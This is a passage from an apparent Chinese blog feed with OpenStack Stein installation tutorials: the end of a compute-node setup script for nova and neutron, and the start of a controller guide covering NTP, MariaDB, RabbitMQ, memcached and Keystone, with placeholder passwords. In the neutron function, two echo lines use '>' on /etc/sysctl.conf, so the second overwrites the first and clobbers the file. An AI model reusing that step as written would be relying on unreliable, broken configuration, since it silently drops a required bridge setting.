class="line"><span class="string">memcached_servers = controller:11211</span></span><br><span class="line"><span class="string">auth_type = password</span></span><br><span class="line"><span class="string">project_domain_name = Default</span></span><br><span class="line"><span class="string">user_domain_name = Default</span></span><br><span class="line"><span class="string">project_name = service</span></span><br><span class="line"><span class="string">username = nova</span></span><br><span class="line"><span class="string">password = NOVA_PASS</span></span><br><span class="line"><span class="string">[libvirt]</span></span><br><span class="line"><span class="string">hw_machine_type=x86_64=pc-i440fx-rhel7.2.0</span></span><br><span class="line"><span class="string">[metrics]</span></span><br><span class="line"><span class="string">[mks]</span></span><br><span class="line"><span class="string">[neutron]</span></span><br><span class="line"><span class="string">url = http://controller:9696</span></span><br><span class="line"><span class="string">auth_url = http://controller:5000</span></span><br><span class="line"><span class="string">auth_type = password</span></span><br><span class="line"><span class="string">project_domain_name = default</span></span><br><span class="line"><span class="string">user_domain_name = default</span></span><br><span class="line"><span class="string">region_name = RegionOne</span></span><br><span class="line"><span class="string">project_name = service</span></span><br><span class="line"><span class="string">username = neutron</span></span><br><span class="line"><span class="string">password = NEUTRON_PASS</span></span><br><span class="line"><span class="string">[notifications]</span></span><br><span class="line"><span class="string">[osapi_v21]</span></span><br><span class="line"><span class="string">[oslo_concurrency]</span></span><br><span class="line"><span class="string">lock_path = /var/lib/nova/tmp</span></span><br><span class="line"><span class="string">[oslo_messaging_amqp]</span></span><br><span class="line"><span class="string">[oslo_messaging_kafka]</span></span><br><span class="line"><span class="string">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="string">[oslo_messaging_rabbit]</span></span><br><span class="line"><span class="string">[oslo_middleware]</span></span><br><span class="line"><span class="string">[oslo_policy]</span></span><br><span class="line"><span class="string">[pci]</span></span><br><span class="line"><span class="string">[placement]</span></span><br><span class="line"><span class="string">region_name = RegionOne</span></span><br><span class="line"><span class="string">project_domain_name = Default</span></span><br><span class="line"><span class="string">project_name = service</span></span><br><span class="line"><span class="string">auth_type = password</span></span><br><span class="line"><span class="string">user_domain_name = Default</span></span><br><span class="line"><span class="string">auth_url = http://controller:5000/v3</span></span><br><span class="line"><span class="string">username = placement</span></span><br><span class="line"><span class="string">password = PLACEMENT_PASS</span></span><br><span class="line"><span class="string">[placement_database]</span></span><br><span class="line"><span class="string">[powervm]</span></span><br><span class="line"><span class="string">[privsep]</span></span><br><span class="line"><span class="string">[profiler]</span></span><br><span class="line"><span class="string">[quota]</span></span><br><span class="line"><span class="string">[rdp]</span></span><br><span class="line"><span class="string">[remote_debug]</span></span><br><span class="line"><span class="string">[scheduler]</span></span><br><span class="line"><span class="string">[serial_console]</span></span><br><span class="line"><span class="string">[service_user]</span></span><br><span class="line"><span class="string">[spice]</span></span><br><span class="line"><span class="string">[upgrade_levels]</span></span><br><span class="line"><span class="string">[vault]</span></span><br><span class="line"><span class="string">[vendordata_dynamic_auth]</span></span><br><span class="line"><span class="string">[vmware]</span></span><br><span class="line"><span class="string">[vnc]</span></span><br><span class="line"><span class="string">enabled = true</span></span><br><span class="line"><span class="string">server_listen = 0.0.0.0</span></span><br><span class="line"><span class="string">server_proxyclient_address = \$my_ip</span></span><br><span class="line"><span class="string">novncproxy_base_url = http://controller:6080/vnc_auto.html</span></span><br><span class="line"><span class="string">[workarounds]</span></span><br><span class="line"><span class="string">[wsgi]</span></span><br><span class="line"><span class="string">[xenserver]</span></span><br><span class="line"><span class="string">[xvp]</span></span><br><span class="line"><span class="string">[zvm]</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now libvirtd.service openstack-nova-compute.service</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_neutron</span></span>() &#123;</span><br><span class="line">    yum install -y openstack-neutron-linuxbridge ebtables ipset &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="built_in">cp</span> /etc/neutron/neutron.conf&#123;,.bak&#125;</span><br><span class="line">    <span class="built_in">cp</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;</span><br><span class="line">    egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.conf</span><br><span class="line">    egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /etc/neutron/neutron.conf</span></span><br><span class="line"><span class="string">[DEFAULT]</span></span><br><span class="line"><span class="string">transport_url = rabbit://openstack:RABBIT_PASS@controller                          </span></span><br><span class="line"><span class="string">auth_strategy = keystone</span></span><br><span class="line"><span class="string">[cors]</span></span><br><span class="line"><span class="string">[database]</span></span><br><span class="line"><span class="string">[keystone_authtoken]</span></span><br><span class="line"><span class="string">www_authenticate_uri = http://controller:5000</span></span><br><span class="line"><span class="string">auth_url = http://controller:5000</span></span><br><span class="line"><span class="string">memcached_servers = controller:11211</span></span><br><span class="line"><span class="string">auth_type = password</span></span><br><span class="line"><span class="string">project_domain_name = default</span></span><br><span class="line"><span class="string">user_domain_name = default</span></span><br><span class="line"><span class="string">project_name = service</span></span><br><span class="line"><span class="string">username = neutron</span></span><br><span class="line"><span class="string">password = NEUTRON_PASS</span></span><br><span class="line"><span class="string">[oslo_concurrency]</span></span><br><span class="line"><span class="string">lock_path = /var/lib/neutron/tmp</span></span><br><span class="line"><span class="string">[oslo_messaging_amqp]</span></span><br><span class="line"><span class="string">[oslo_messaging_kafka]</span></span><br><span class="line"><span class="string">[oslo_messaging_notifications]</span></span><br><span class="line"><span class="string">[oslo_messaging_rabbit]</span></span><br><span class="line"><span class="string">[oslo_middleware]</span></span><br><span class="line"><span class="string">[oslo_policy]</span></span><br><span class="line"><span class="string">[privsep]</span></span><br><span class="line"><span class="string">[ssl]</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span></span><br><span class="line"><span class="string">[DEFAULT]</span></span><br><span class="line"><span class="string">[linux_bridge]                                                                </span></span><br><span class="line"><span class="string">physical_interface_mappings = provider:ens33                </span></span><br><span class="line"><span class="string">[vxlan]                                                                       </span></span><br><span class="line"><span class="string">enable_vxlan = false                                                          </span></span><br><span class="line"><span class="string">[securitygroup]                                                               </span></span><br><span class="line"><span class="string">enable_security_group = true                                                  </span></span><br><span class="line"><span class="string">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;br_netfilter&quot;</span> &gt;&gt; /etc/modules-load.d/bridge.conf</span><br><span class="line">    modprobe br_netfilter</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;net.bridge.bridge-nf-call-iptables = 1 &quot;</span> &gt; /etc/sysctl.conf</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;net.bridge.bridge-nf-call-ip6tables = 1&quot;</span> &gt; /etc/sysctl.conf</span><br><span class="line">    sysctl -p</span><br><span class="line">    systemctl <span class="built_in">enable</span> --now neutron-linuxbridge-agent.service</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 检查</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$eth_name</span>&quot;</span> ] || [ -z <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ip获取失败，请检查网卡名字和ip&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">set_chrony</span><br><span class="line">install_base_package</span><br><span class="line">install_nova</span><br><span class="line">install_neutron</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;安装成功&quot;</span></span><br></pre></td></tr></table></figure><p>验证结果<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250107134835.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105155855.png"></p>]]></content>
    
    
    <summary type="html">前言
官方默认搭建的文档是1控制1计算，实际1个计算节点肯定是不行的，这篇文章将基于openstack集群进行增加计算节点，如果是已经正确的搭建过一次1控制1计算的openstack则本文实操起来应该并不难，因为需要安装的组件就两个，下面开始。(S版本)

环境配置
环境是一台CentOS7.9的机器，然后selinux和firewalld都是关闭的，因为条件有限配置是1H1G的配置。

网络环境
主机名为compute2。修改网络内全部的hosts文件，如果有dns则更好

1
2
3
4
5
6
7
8
9


[root@compute2 ~]# cat /etc/hosts      </summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Stein" scheme="https://blog.boychai.xyz/tags/Stein/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-Stein版搭建-1控制1计算</title>
    <link href="https://blog.boychai.xyz/2025/01/04/OpenStack-Stein%E7%89%88%E6%90%AD%E5%BB%BA-1%E6%8E%A7%E5%88%B61%E8%AE%A1%E7%AE%97/"/>
    <id>https://blog.boychai.xyz/2025/01/04/OpenStack-Stein%E7%89%88%E6%90%AD%E5%BB%BA-1%E6%8E%A7%E5%88%B61%E8%AE%A1%E7%AE%97/</id>
    <published>2025-01-04T15:39:00.000Z</published>
    <updated>2025-07-17T05:40:18.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h1><p>Open stack的版本是从A-Z之后的版本似乎是通过年月日来命名的，目前最新版本为<code>2025.1-dev</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241227210146.png" alt="版本列表"><br>2024.2的版本，从U版开始就得用CentOS8部署了，具体原因没考究，大概率是因为内核的原因，本篇是S版本的教程，具体<a href="https://docs.openstack.org/stein/index.html">参考</a></p><h1 id="组件选择"><a href="#组件选择" class="headerlink" title="组件选择"></a>组件选择</h1><p>本文只装最基础的组件，Keystone、Glance、Placement、Nova、Neutron、Horizon</p><h1 id="基础环境配置"><a href="#基础环境配置" class="headerlink" title="基础环境配置"></a>基础环境配置</h1><h2 id="网络环境配置"><a href="#网络环境配置" class="headerlink" title="网络环境配置"></a>网络环境配置</h2><p>我这里采用两台主机构建基础的openstack，具体可参考文档： <a href="https://docs.openstack.org/install-guide/environment-networking-controller.html">https://docs.openstack.org/install-guide/environment-networking-controller.html</a></p><table><thead><tr><th>角色</th><th>系统</th><th>配置</th></tr></thead><tbody><tr><td>controller</td><td>CentOS 7.9</td><td>4G2H</td></tr><tr><td>compute1</td><td>CentOS7.9</td><td>1G1H</td></tr><tr><td>所有主机都配置一下hosts文件，有DNS服务则更好，主机名请跟随hosts文件。</td><td></td><td></td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6     </span><br><span class="line"><span class="comment"># controller              </span></span><br><span class="line">10.0.0.11       controller</span><br><span class="line"><span class="comment"># compute1              </span></span><br><span class="line">10.0.0.31       compute1</span><br></pre></td></tr></table></figure><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>OpenStack所有服务之前是使用Token进行验证的,token都是有有效期的,如果时间对不上则可能会出现token刚分配好就过期了的问题，为了避免时间上不一样的问题，这里使用NTP来进行时间同步。这里使用controller(控制节点)来做NTP服务主机。<br>在每台主机中执行下面命令来设置时区和安装NTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# timedatectl set-timezone Asia/Shanghai</span><br><span class="line"></span><br><span class="line">[root@controller ~]# yum -y install chrony</span><br></pre></td></tr></table></figure><p>下面编辑配置文件<code>/etc/chrony.conf</code>,内容主要参考下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/chrony.conf |egrep -v <span class="string">&quot;^#|^$&quot;</span>     </span><br><span class="line">server ntp5.aliyun.com iburst  </span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line">makestep 1.0 3        </span><br><span class="line">rtcsync               </span><br><span class="line">allow 10.0.0.0/24     </span><br><span class="line">logdir /var/log/chrony</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# systemctl restart chronyd</span><br></pre></td></tr></table></figure><p>其他openstack主机参考下面配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# <span class="built_in">cat</span> /etc/chrony.conf |egrep -v <span class="string">&quot;^#|^$&quot;</span>                          </span><br><span class="line">server controller iburst                                                           </span><br><span class="line">driftfile /var/lib/chrony/drift                                                    </span><br><span class="line">makestep 1.0 3                                                                     </span><br><span class="line">rtcsync                                                                            </span><br><span class="line">logdir /var/log/chrony</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# systemctl restart chronyd</span><br></pre></td></tr></table></figure><p>查看状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># controller 主机</span></span><br><span class="line">[root@controller ~]# chronyc sources                                               </span><br><span class="line">210 Number of sources = 1                                                          </span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample                   </span><br><span class="line">===============================================================================    </span><br><span class="line">^* 203.107.6.88                  2   6   377    20   -415us[ -498us] +/-   18ms    </span><br><span class="line">[root@controller ~]# <span class="built_in">date</span></span><br><span class="line">Sat Dec 28 20:38:25 CST 2024                                                       </span><br><span class="line">[root@controller ~]#</span><br><span class="line"><span class="comment"># compute1 主机</span></span><br><span class="line">[root@compute1 ~]# chronyc sources                                                 </span><br><span class="line">210 Number of sources = 1                                                          </span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample                   </span><br><span class="line">===============================================================================    </span><br><span class="line">^* controller                    3   6   377    51   +348us[ +428us] +/-   20ms    </span><br><span class="line">[root@compute1 ~]# <span class="built_in">date</span></span><br><span class="line">Sat Dec 28 20:38:29 CST 2024                                                       </span><br></pre></td></tr></table></figure><p>时间已经同步。</p><h2 id="基础软件包"><a href="#基础软件包" class="headerlink" title="基础软件包"></a>基础软件包</h2><p>我这里是安装s版本的openstack，参考文档地址： <a href="https://docs.openstack.org/install-guide/environment-packages-rdo.html">https://docs.openstack.org/install-guide/environment-packages-rdo.html</a><br>所有主机都执行下面命令,用来安装openstack对应的yum仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y centos-release-openstack-stein</span><br></pre></td></tr></table></figure><p>在24年12月28日，他自己的这些源有一部分是不可以用的,通过下面命令进行替换阿里的镜像站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">sed -i <span class="string">&#x27;s/mirrorlist=/#mirrorlist=/g&#x27;</span> *.repo</span><br><span class="line">sed -i <span class="string">&#x27;s/#baseurl=/baseurl=/g&#x27;</span> *.repo</span><br><span class="line">sed -i <span class="string">&#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27;</span> *.repo</span><br></pre></td></tr></table></figure><p>安装openstack的客户端管理工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install python-openstackclient -y </span><br></pre></td></tr></table></figure><h2 id="数据库支持"><a href="#数据库支持" class="headerlink" title="数据库支持"></a>数据库支持</h2><p>在控制节点安装下面工具,文档参考地址： <a href="https://docs.openstack.org/install-guide/environment-sql-database-rdo.html">https://docs.openstack.org/install-guide/environment-sql-database-rdo.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y mariadb mariadb-server python2-PyMySQL</span><br></pre></td></tr></table></figure><p>根据配置文件，修改一下数据库的配置，编辑文件<code>/etc/my.cnf.d/openstack.cnf</code>，添加下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">bind-address = 10.0.0.11</span><br><span class="line"></span><br><span class="line">default-storage-engine = innodb</span><br><span class="line">innodb_file_per_table = on</span><br><span class="line">max_connections = 4096</span><br><span class="line">collation-server = utf8_general_ci</span><br><span class="line">character-set-server = utf8</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now mariadb.service</span><br></pre></td></tr></table></figure><p>之后执行命令<code>mysql_secure_installation</code>安全初始化一下数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation                           </span><br></pre></td></tr></table></figure><p>我执行的是,并且它们分别代表的含义是</p><ul><li>登录的密码 回车(刚装的都是没密码的，所以直接回车)</li><li>是否设置root密码 n(不设置，这个等后面设置)</li><li>是否移除匿名用户 Y(移除)</li><li>是否禁用root远程登陆 Y(禁用)</li><li>是否移除test数据库 Y(移除)</li><li>是否重载权限表 Y(重载)</li></ul><h2 id="消息队列支持"><a href="#消息队列支持" class="headerlink" title="消息队列支持"></a>消息队列支持</h2><p>open stack支持多种的消息队列，建议使用rabbitmq，这里也不用其他的了。具体可以参考文档： <a href="https://docs.openstack.org/install-guide/environment-messaging-rdo.html">https://docs.openstack.org/install-guide/environment-messaging-rdo.html</a><br>在控制节点执行下面命令安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y rabbitmq-server</span><br><span class="line">systemctl <span class="built_in">enable</span> --now rabbitmq-server.service</span><br><span class="line"><span class="comment"># 这一步是创建一个rabbit的用户，并且设置密码</span></span><br><span class="line">rabbitmqctl add_user openstack RABBIT_PASS</span><br><span class="line"><span class="comment"># 授权新建的用户权限</span></span><br><span class="line">rabbitmqctl set_permissions openstack <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure><h2 id="缓存支持"><a href="#缓存支持" class="headerlink" title="缓存支持"></a>缓存支持</h2><p>在控制节点为openstack提供缓存支持，具体可参考文档： <a href="https://docs.openstack.org/install-guide/environment-memcached-rdo.html">https://docs.openstack.org/install-guide/environment-memcached-rdo.html</a><br>执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y memcached python-memcached</span><br></pre></td></tr></table></figure><p>紧接着修改一下他的配置文件&#96;&#x2F;etc&#x2F;sysconfig&#x2F;memcached</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS=&quot;-l 127.0.0.1,::1&quot;</span><br><span class="line"># 把上面内容替换成下面的内容</span><br><span class="line">OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;</span><br></pre></td></tr></table></figure><p>替换的作用主要是为了公开服务，默认只是监听本地的127.0.0.1，外部是无法访问的，<code>controller</code>则是自己的主机的域名，指向的是自己在当前网络环境的ip。<br>执行下面命令启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now memcached.service</span><br></pre></td></tr></table></figure><h2 id="ETCD支持"><a href="#ETCD支持" class="headerlink" title="ETCD支持"></a>ETCD支持</h2><p>本架构不需要ETCD的支持，本文安装的组件和ETCD都没关联。其他组件可能用到ETCD，在进阶的安装情况下得注意这个基础环境。</p><h1 id="组件安装"><a href="#组件安装" class="headerlink" title="组件安装"></a>组件安装</h1><p>参考文档： <a href="https://docs.openstack.org/keystone/stein/install/">https://docs.openstack.org/keystone/stein/install/</a><br>关于文档要注意的是，默认文档打开是没有老版本文档的直链的，需要在stein替换成自己想要装的版本。</p><h2 id="Keystone-认证服务"><a href="#Keystone-认证服务" class="headerlink" title="Keystone - 认证服务"></a>Keystone - 认证服务</h2><p>参考文档： <a href="https://docs.openstack.org/keystone/stein/install/keystone-install-rdo.html">https://docs.openstack.org/keystone/stein/install/keystone-install-rdo.html</a><br>在控制节点执行下面内容，用来授权Keystone服务在数据库中的支持</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# mysql                                                         </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.                        Your MariaDB connection <span class="built_in">id</span> is 15                                                   Server version: 10.3.10-MariaDB MariaDB Server                                     Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.               Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.     MariaDB [(none)]&gt; CREATE DATABASE keystone;                                        Query OK, 1 row affected (0.000 sec)                                               MariaDB [(none)]&gt;  GRANT ALL PRIVILEGES ON keystone.* TO <span class="string">&#x27;keystone&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \      -&gt; IDENTIFIED BY <span class="string">&#x27;KEYSTONE_DBPASS&#x27;</span>;                                            Query OK, 0 rows affected (0.001 sec)                                              MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON keystone.* TO <span class="string">&#x27;keystone&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \               -&gt; IDENTIFIED BY <span class="string">&#x27;KEYSTONE_DBPASS&#x27;</span>;                                            </span><br><span class="line">Query OK, 0 rows affected (0.000 sec) </span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure><p>安装相关的包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-keystone httpd mod_wsgi</span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/keystone/keystone.conf</code>,再修改之前需要注意的是,文件中有很多很多的注释,还全都是英文的,而且里面有很多Keystone不同类型的配置，直接修改并不好，这里可以通过执行下面命令来简化原本的配置文件，之后在进行修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/keystone/keystone.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/keystone/keystone.conf.bak &gt; /etc/keystone/keystone.conf</span><br></pre></td></tr></table></figure><p>正常来说，配置文件中所有的配置段的配置都是空的，然后现在添加下面配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># database 配置段中添加下面配置，这里是连接数据库的协议连接，具体代表的内容这里不多写。</span><br><span class="line">connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone</span><br><span class="line"># token 配置段中添加下面配置，这段配置的作用是指定当前组件使用什么方法提供令牌。</span><br><span class="line">provider = fernet</span><br></pre></td></tr></table></figure><p>保存后去用keystone的身份去填充数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;keystone-manage db_sync&quot;</span> keystone</span><br></pre></td></tr></table></figure><p>填充后可以使用下面命令去验证，正常的情况应该是会有好多表，如果啥都没有那应该是出问题了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql keystone -e <span class="string">&quot;show tables;&quot;</span></span><br></pre></td></tr></table></figure><p>下面开始初始化 Fernet 密钥存储库，执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone</span><br><span class="line">keystone-manage credential_setup --keystone-user keystone --keystone-group keystone</span><br></pre></td></tr></table></figure><p>初始化keystone,这里定义了一些基础信息,如果有修改请根据自己的环境修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keystone-manage bootstrap --bootstrap-password ADMIN_PASS \</span><br><span class="line"> --bootstrap-admin-url http://controller:5000/v3/ \</span><br><span class="line"> --bootstrap-internal-url http://controller:5000/v3/ \</span><br><span class="line"> --bootstrap-public-url http://controller:5000/v3/ \</span><br><span class="line"> --bootstrap-region-id RegionOne</span><br></pre></td></tr></table></figure><p>下面开始配置一下Apache，编辑<code>/etc/httpd/conf/httpd.conf</code>配置<code>ServerName</code>为<code>controller</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerName controller</span><br></pre></td></tr></table></figure><p>再把keystone的apache配置链接到apache的http.d中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/</span><br></pre></td></tr></table></figure><p>启用服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now httpd.service</span><br></pre></td></tr></table></figure><p>声明一下环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=ADMIN_PASS</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://controller:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br></pre></td></tr></table></figure><p>使用此链接的命令之前请务必配置上面所描述的环境变量。关于创建基础域、项目、用户和角色，具体可以参考： <a href="https://docs.openstack.org/keystone/stein/install/keystone-users-rdo.html">https://docs.openstack.org/keystone/stein/install/keystone-users-rdo.html</a><br>声明客户端环境变量脚本，其他用户可以参考： <a href="https://docs.openstack.org/keystone/stein/install/keystone-openrc-rdo.html#using-the-scripts">https://docs.openstack.org/keystone/stein/install/keystone-openrc-rdo.html#using-the-scripts</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; admin-openrc &lt;</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default                         <span class="built_in">export</span> 